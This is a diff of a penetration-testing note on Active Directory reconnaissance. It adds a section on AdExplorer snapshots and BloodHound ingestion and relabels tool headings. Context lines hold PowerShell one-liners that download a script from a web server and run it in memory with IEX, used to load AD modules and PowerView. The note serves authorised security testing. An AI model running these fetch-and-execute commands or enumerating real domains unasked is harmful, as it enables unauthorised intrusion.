@@ -24,7 +24,7 @@ $creds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNA
 <RSAT_AD_CMDLET> -Credential <PSCredential> -Server <DC_HOSTNAME | DC_IP>
 ```
 
-###### Microsoft Management Console (mmc.exe)
+###### [GUI] Microsoft Management Console (mmc.exe)
 
 The `Microsoft Management Console (MMC)` utility allows for the loading of
 the `Remote Server Administration Tools (RSAT)` utilities, such as
@@ -42,7 +42,39 @@ Once the utility is loaded, the Domain Controller queried by the snap-in may
 be specified by right clicking on the utility and going through the
 `Change Directory Server` / `Change Active Directory Domain Controller` form.
 
-###### Remote Server Administration Tools (RSAT) - PowerShell
+###### [GUI] Sysinternals's AdExplorer
+
+`Active Directory Explorer (ADExplorer)`, part of the `Sysinternals` suite, is
+a standalone graphical utility that can be used to access and browse Active
+Directory domains. `AdExplorer` presents the advantage of being digitally
+signed by Microsoft and potentially legitimately used in the environment.
+`ADExplorer` rely on the `LDAP` protocol (port `TCP` 389) by default, and
+supports the `LDAPS` protocol (port `TCP` 636).
+
+While `AdExplorer` connection prompt contains username and password fields, the
+current security context is used for the connection if both fields are left
+empty.
+
+As one of it's most predominant feature, `AdExplorer` offers the ability to
+take "snapshots" of the Active Directory domain, allowing for off-target /
+offline viewing of Active Directory objects. For medium to large sized domains,
+a snapshot can weight hundreds of megabytes to a few gigabytes.
+
+Once connected to an Active Directory domain, the procedure to take a snapshot
+is as follow:
+
+```
+File -> Create Snapshot... (or directly through the save icon)
+  -> Path for the snapshot file
+  -> Optional throttle to limit the usage of resource
+```
+
+`AdExplorer` snapshots can be used as an ingestor for `BloodHound` using the
+[`ADExplorerSnapshot.py`](https://github.com/c3c/ADExplorerSnapshot.py) Python
+script. Refer to the `[ActiveDirectory] Recon - AD scanners` note for more
+information.
+
+###### [CLI] Remote Server Administration Tools (RSAT) - PowerShell
 
 The `Remote Server Administration Tools (RSAT)` suite includes a number of
 utilities useful for Active Directory reconnaissance and notably the
@@ -94,7 +126,7 @@ may also be used to import the Active Directory module:
 IEX (new-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Import-ActiveDirectory.ps1'); Import-ActiveDirectory
 ```
 
-###### PowerSploit PowerView
+###### [CLI] PowerSploit PowerView
 
 `PowerView` is a PowerShell tool to gain network situational awareness on
 Windows domains. It contains a set of pure-PowerShell replacements for various
@@ -138,7 +170,7 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 SharpView.exe <CMDLET> <LIST_ARGUMENTS>
 ```
 
-###### AdFind
+###### [CLI] AdFind
 
 `AdFind` is a command-line `C++` utility that can be used as a standalone
 binary for Active Directory reconnaissance. `AdFind` implements a number of
@@ -152,7 +184,7 @@ AdFind.exe <SWITCHES> [-b <BASE_DN>] [-f <LDAP_FILTER>] [<ATTRIBUTE_FILTER>]
 AdFind.exe -gc -list -f (objectcategory=user) sAMAccountName objectSid
 ```
 
-###### Active Directory Services Interfaces (ADSI)
+###### [CLI] Active Directory Services Interfaces (ADSI)
 
 `Active Directory Services Interfaces (ADSI)` is a set of interfaces built-in
 the Windows operating system. The `DirectoryEntry` and `DirectorySearcher`
